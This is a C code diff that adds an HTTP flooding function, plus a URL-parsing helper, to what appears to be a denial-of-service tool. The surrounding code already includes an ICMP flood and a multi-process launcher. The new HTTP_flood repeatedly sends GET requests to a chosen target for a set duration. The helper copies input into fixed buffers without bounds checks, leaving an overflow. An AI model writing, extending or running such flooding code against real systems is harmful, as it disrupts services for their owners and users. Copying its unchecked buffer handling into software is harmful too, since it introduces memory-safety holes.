@@ -55,6 +55,22 @@ unsigned char* rand_bytes(unsigned int size){
 	return stream;
 }
 
+void parse_url(const char *url, char *host, char *path) {
+    if (strncmp(url, "http://", 7) == 0) {
+        url += 7;
+    }
+
+    const char *path_start = strchr(url, '/');
+    if (path_start) {
+        strncpy(host, url, path_start - url);
+        host[path_start - url] = '\0';
+        strcpy(path, path_start);
+    } else {
+        strcpy(host, url);
+        strcpy(path, "/");
+    }
+}
+
 unsigned short random_ushort() {
 	srand(time(NULL));
 	return (unsigned short)((rand() << 8) | (rand() & 0xFF));
@@ -158,6 +174,46 @@ int ICMP_flood(char *target, unsigned short port, unsigned int msg_len, time_t d
     return 0;
 }
 int HTTP_flood(char *target, unsigned short port, unsigned int msg_len, time_t duration){
+    char host[256];
+    char path[1024];
+    parse_url(target, host, path);
+
+    struct hostent *server = gethostbyname(host);
+    if (!server) {
+        fprintf(stderr, "Failed to resolve host: %s\n", host);
+        return 1;
+    }
+
+    int sock = socket(AF_INET, SOCK_STREAM, 0);
+    if (sock < 0) {
+        perror("Socket creation failed");
+        return 2;
+    }
+
+    struct sockaddr_in serv_addr;
+    serv_addr.sin_family = AF_INET;
+    serv_addr.sin_port = htons(80);
+    serv_addr.sin_addr = *((struct in_addr *)server->h_addr);
+    memset(&(serv_addr.sin_zero), 0, 8);
+
+    if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
+        perror("Connection failed");
+        close(sock);
+        return 3;
+    }
+
+    char request[2048];
+    snprintf(request, sizeof(request),
+             "GET %s HTTP/1.1\r\n"
+             "Host: %s\r\n"
+             "Connection: close\r\n"
+             "\r\n",
+             path, host);
+    time_t end = time(NULL) + duration;
+    while(time(NULL)<end){
+    send(sock, request, strlen(request), 0);
+    }
+    close(sock);
     return 0;
 }
 void run_processes(int n, int (*func)(char*, unsigned short, unsigned int, time_t), char *target, unsigned short port, unsigned int msg_len, time_t duration) {
